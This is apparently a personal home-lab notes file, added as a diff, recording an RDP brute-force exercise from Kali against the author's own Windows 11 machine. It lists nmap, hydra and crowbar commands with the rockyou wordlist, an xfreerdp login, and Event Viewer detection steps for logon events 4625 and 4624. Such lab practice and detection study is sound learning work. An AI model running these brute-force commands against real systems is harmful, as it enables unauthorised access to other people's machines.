@@ -1,0 +1,49 @@
+RDP BRUTE FORCE ATTACK - COMMANDS I USED
+
+Date: 16 March 2026
+Setup: Kali (192.168.1.18) → Windows 11 (192.168.1.16)
+
+
+ATTACKER SIDE - KALI LINUX
+
+1. CHECK IF RDP PORT IS OPEN
+nmap -p 3389 192.168.1.16
+
+2. CREATE TEST USER ON WINDOWS (run on victim machine)
+net user testuser Test@123 /add
+net localgroup Administrators testuser /add
+
+3. HYDRA ATTEMPT (first try - but it failed)
+hydra -l testuser -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.16 -t 1 -w 5 -V
+
+4. INSTALL CROWBAR (better for RDP)
+sudo apt install crowbar -y
+
+5. CONVERT WORDLIST TO UTF-8 (fix encoding error)
+sudo iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt -o /usr/share/wordlists/rockyou-utf8.txt
+
+6. RUN CROWBAR ATTACK
+crowbar -b rdp -s 192.168.1.16 -u testuser -C /usr/share/wordlists/rockyou-utf8.txt -v
+
+7. MANUAL LOGIN TO VERIFY CREDENTIALS
+xfreerdp /v:192.168.1.16 /u:testuser /p:Test@123
+
+
+DETECTION SIDE - WINDOWS EVENT VIEWER
+
+8. CHECK FAILED LOGIN ATTEMPTS (Event ID 4625)
+Open Event Viewer → Windows Logs → Security → Filter Current Log → Event ID: 4625
+
+9. CHECK SUCCESSFUL LOGINS (Event ID 4624)
+Open Event Viewer → Windows Logs → Security → Filter Current Log → Event ID: 4624
+
+10. CHECK LOGON TYPE (RDP is Type 10)
+In Event ID 4624 details, look for "Logon Type: 10"
+
+
+WHAT I LEARNED FROM ERRORS:
+
+- Hydra RDP module is unstable - it kept failing
+- Crowbar works better for RDP attacks
+- Rockyou.txt needs UTF-8 conversion or it gives encoding errors
+- Wordlist is too big (14 million passwords) - takes hours to complete
